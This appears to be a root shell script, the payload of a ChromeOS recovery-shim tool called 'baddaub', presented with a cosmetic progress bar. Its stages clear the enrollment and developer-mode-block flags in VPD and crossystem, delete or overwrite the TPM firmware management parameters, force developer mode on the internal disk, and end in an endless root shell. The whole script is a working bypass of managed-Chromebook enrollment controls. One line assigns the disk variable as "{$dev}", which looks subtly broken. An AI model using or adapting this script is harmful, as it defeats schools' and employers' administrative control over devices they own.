#!/bin/sh

#yes, this script was almost 100% modified by ai. for aesthetics 

SCRIPT_DATE="[2024-10-10]"

# spinner is always the 2nd /bin/sh
spinner_pid=$(pgrep /bin/sh | head -n 2 | tail -n 1)
kill -9 "$spinner_pid"
pkill -9 tail
sleep 0.1

HAS_FRECON=0
if pgrep frecon >/dev/null 2>&1; then
	HAS_FRECON=1
	# restart frecon to make VT1 background black
	exec </dev/null >/dev/null 2>&1
	pkill -9 frecon || :
	rm -rf /run/frecon
	frecon-lite --enable-vt1 --daemon --no-login --enable-vts --pre-create-vts --num-vts=4 --enable-gfx
	until [ -e /run/frecon/vt0 ]; do
		sleep 0.1
	done
	exec </run/frecon/vt0 >/run/frecon/vt0 2>&1
	# note: switchvt OSC code only works on 105+
	printf "\033]switchvt:0\a\033]input:off\a"
	echo "Press CTRL+ALT+F1 if you're seeing this" | tee /run/frecon/vt1 /run/frecon/vt2 >/run/frecon/vt3
else
	exec </dev/tty1 >/dev/tty1 2>&1
	chvt 1
	stty -echo
	echo "Press CTRL+ALT+F1 if you're seeing this" | tee /dev/tty2 /dev/tty3 >/dev/tty4
fi

printf "\033[?25l\033[2J\033[H"

# Display ASCII Art
echo ""
echo "baddaub"
echo ""

# Loading bar function
update_loading_bar() {
	local progress=$1
	local width=60
	local filled=$((width * progress / 100))
	local empty=$((width - filled))
	
	printf "\r["
	printf "%${filled}s" | tr ' ' '#'
	printf "%${empty}s" | tr ' ' '.'
	printf "] %3d%%" $progress
}

# Initial loading bar
update_loading_bar 0

# Stage 1: Creating RW /tmp
mount -t tmpfs -o rw,exec,size=50M tmpfs /tmp >/dev/null 2>&1
update_loading_bar 10

# Stage 2: Modifying VPD check_enrollment
vpd -i RW_VPD -s check_enrollment=0 >/dev/null 2>&1
update_loading_bar 20

# Stage 3: Modifying VPD block_devmode
vpd -i RW_VPD -s block_devmode=0 >/dev/null 2>&1
update_loading_bar 30

# Stage 4: Setting crossystem block_devmode
crossystem block_devmode=0 >/dev/null 2>&1
update_loading_bar 40

# Stage 5: Checking and removing FWMP
has_fwmp() {
	local result
	result=$(tpmc read 0x100a 0x28 2>/dev/null) || return 1
	set -- $result
	[ "$#" -eq 40 ] || return 1
	shift 4
	for i; do
		[ "$i" = 0 ] || return 0
	done
	return 1
}

if has_fwmp; then
	tpmc undef 0x100a >/dev/null 2>&1
	tpmc_code=$?
	if [ $tpmc_code -ne 0 ]; then
		tpmc write 0x100a 76 28 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >/dev/null 2>&1
	fi
fi
update_loading_bar 50

# Stage 6: Loading disk utilities
. /usr/sbin/write_gpt.sh >/dev/null 2>&1
load_base_vars >/dev/null 2>&1
update_loading_bar 60

# Stage 7: Finding internal disk
get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}

TARGET_DEVICE=$(get_fixed_dst_drive)
update_loading_bar 70

# Stage 8: Setting up device partition
if echo "$TARGET_DEVICE" | grep -q '[0-9]$'; then
	TARGET_DEVICE_P="$TARGET_DEVICE"p
else
	TARGET_DEVICE_P="$TARGET_DEVICE"
fi
update_loading_bar 80

# Stage 9: Enabling developer mode
stateful_mnt=$(mktemp -d)
if mount "$TARGET_DEVICE_P"1 "$stateful_mnt" >/dev/null 2>&1; then
	touch "$stateful_mnt/.developer_mode" >/dev/null 2>&1
	umount "$stateful_mnt" >/dev/null 2>&1
fi
rmdir "$stateful_mnt" >/dev/null 2>&1
update_loading_bar 90

# Stage 10: Final setup
sleep 0.5
update_loading_bar 100

if [ $HAS_FRECON -eq 1 ]; then
	printf "\033]input:on\a"
else
	stty echo
fi

printf "\n"
echo "launching baddaub.sh"
sh /usb/usr/sbin/baddaub.sh
printf "\033[?25h"
while :; do sh; done
